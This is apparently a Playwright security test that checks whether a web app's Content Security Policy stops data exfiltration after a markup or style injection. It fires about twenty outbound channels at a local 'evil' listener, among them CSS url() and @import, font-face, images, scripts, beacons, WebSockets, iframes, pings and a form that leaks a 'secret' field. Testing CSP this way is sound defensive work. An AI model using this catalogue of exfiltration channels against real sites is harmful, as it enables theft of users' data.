// vp3r3-csp.mjs — VP3 re-attack, Attack 2: CSP exfil-channel matrix.
// Premise: an attacker with a MARKUP/style injection primitive inside the app
// page (markup-XSS without script loads — script-src 'self' + no unsafe-eval
// kills <script> and eval; the question is whether style-src 'unsafe-inline'
// opens an exfil channel). Every channel is fired in the real app page and
// watched via route interception + a real evil listener; positive controls
// (same-origin channels) prove the harness can see a channel that IS allowed.
import { chromium } from '/home/z/.npm-global/lib/node_modules/playwright/index.mjs';
import { createServer } from 'node:http';

const BASE = 'http://127.0.0.1:8080';
const EVIL_PORT = 9779;
const hits = [];
const evil = createServer((req, res) => {
  hits.push(req.method + ' ' + req.url);
  res.writeHead(200, { 'access-control-allow-origin': '*', 'content-type': 'text/plain' });
  res.end('evil');
});
await new Promise((r) => evil.listen(EVIL_PORT, '127.0.0.1', r));
const EVIL = 'http://127.0.0.1:' + EVIL_PORT;

const browser = await chromium.launch();
const ctx = await browser.newContext();
const page = await ctx.newPage();
const seen = [];
const csp = [];
page.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) csp.push(m.text().slice(0, 100)); });
await ctx.route('**/*', async (route) => {
  const u = route.request().url();
  seen.push(u);
  if (u.startsWith(BASE) || u.startsWith('data:')) return route.continue();
  return route.continue(); // let evil attempts land on the evil server
});
await page.goto(BASE + '/index.html');
await page.waitForTimeout(400);

// every channel, fired inside the app document (CSP of the app applies)
const results = await page.evaluate(async (evil) => {
  const R = {};
  const fire = (name, fn) => { try { fn(); R[name] = 'fired'; } catch (e) { R[name] = 'threw: ' + String(e).slice(0, 60); } };
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  // --- the task's primary vector: style attribute background:url(//evil) ---
  fire('style-attr-bg', () => { document.body.style.background = 'url(' + evil + '/style-attr-bg)'; });
  fire('style-attr-bg-protocol-relative', () => { document.documentElement.setAttribute('style', 'background:url(//127.0.0.1:' + evil.split(':')[2] + '/style-attr-pr)'); });
  // --- <style> element content ---
  fire('style-elem-import', () => {
    const s = document.createElement('style');
    s.textContent = "@import url('" + evil + "/style-import.css');";
    document.head.appendChild(s);
  });
  fire('style-elem-bg', () => {
    const s = document.createElement('style');
    s.textContent = 'body{background:url(' + evil + '/style-elem-bg)}';
    document.head.appendChild(s);
  });
  fire('style-elem-fontface', () => {
    const s = document.createElement('style');
    s.textContent = "@font-face{font-family:x;src:url('" + evil + "/evil.woff2')}";
    document.head.appendChild(s);
  });
  // --- <link rel=stylesheet> remote ---
  fire('link-stylesheet', () => {
    const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = evil + '/link.css';
    document.head.appendChild(l);
  });
  // --- images ---
  fire('img-src', () => { const i = document.createElement('img'); i.src = evil + '/img'; document.body.appendChild(i); });
  fire('new-Image', () => { new Image().src = evil + '/new-image'; });
  // --- script loads ---
  fire('script-src-remote', () => { const s = document.createElement('script'); s.src = evil + '/x.js'; document.head.appendChild(s); });
  // --- dynamic import ---
  try { await import(evil + '/mod.js'); R['dynamic-import'] = 'loaded'; } catch (e) { R['dynamic-import'] = 'threw: ' + String(e).slice(0, 60); }
  // --- XHR ---
  fire('xhr', () => { const x = new XMLHttpRequest(); x.open('GET', evil + '/xhr'); x.send(); });
  // --- sendBeacon ---
  fire('sendBeacon', () => { navigator.sendBeacon(evil + '/beacon', 'x'); });
  // --- WebSocket / EventSource ---
  fire('websocket', () => { try { new WebSocket('ws://127.0.0.1:' + evil.split(':')[2] + '/ws'); } catch (e) { throw e; } });
  fire('eventsource', () => { new EventSource(evil + '/es'); });
  // --- frames / objects / media ---
  fire('iframe-src', () => { const f = document.createElement('iframe'); f.src = evil + '/frame'; f.style.width = '1px'; document.body.appendChild(f); });
  fire('object-data', () => { const o = document.createElement('object'); o.data = evil + '/obj'; document.body.appendChild(o); });
  fire('video-src', () => { const v = document.createElement('video'); v.src = evil + '/vid'; document.body.appendChild(v); });
  // --- form submission ---
  fire('form-get-submit', () => {
    const f = document.createElement('form'); f.method = 'GET'; f.action = evil + '/form';
    const i = document.createElement('input'); i.name = 'secret'; i.value = 'leak';
    f.appendChild(i); document.body.appendChild(f); f.submit();
  });
  // --- ping ---
  fire('a-ping', () => {
    const a = document.createElement('a'); a.href = BASE + '/#x'; a.ping = evil + '/ping';
    document.body.appendChild(a); a.click();
  });
  // --- preload/prefetch ---
  fire('link-preload-img', () => {
    const l = document.createElement('link'); l.rel = 'preload'; l.as = 'image'; l.href = evil + '/preload';
    document.head.appendChild(l);
  });
  await sleep(1200);

  // --- positive controls: channels CSP DOES allow (must be seen) ---
  fire('img-self', () => { const i = document.createElement('img'); i.src = '/css/style.css'; i.style.width = '1px'; i.style.height = '1px'; document.body.appendChild(i); });
  fire('style-attr-bg-self', () => { document.body.style.background = 'url(/css/style.css)'; });
  fire('img-data-url', () => { const i = document.createElement('img'); i.src = 'data:image/gif;base64,R0lGODlhAQABAAAAACw='; document.body.appendChild(i); });
  await sleep(1200);
  return R;
}, EVIL);

await page.waitForTimeout(800);

const evilHits = hits.map((h) => h.split(' ')[1]);
console.log('=== channel fire results (in-page) ===');
for (const [k, v] of Object.entries(results)) console.log('  ' + k.padEnd(34) + ' ' + v);
console.log('\n=== evil server hits (ANY exfil that escaped CSP) ===');
console.log(evilHits.length ? evilHits.join('\n') : '(NONE — no byte left the app origin)');
console.log('\n=== positive-control channels that DID load (harness validity) ===');
console.log(seen.filter((u) => u.startsWith(BASE) && u.includes('style.css')).join('\n') || '(none seen!)');
console.log('\n=== CSP violations logged ===');
console.log([...new Set(csp)].join('\n') || '(none)');
await browser.close();
evil.close();
process.exit(0);
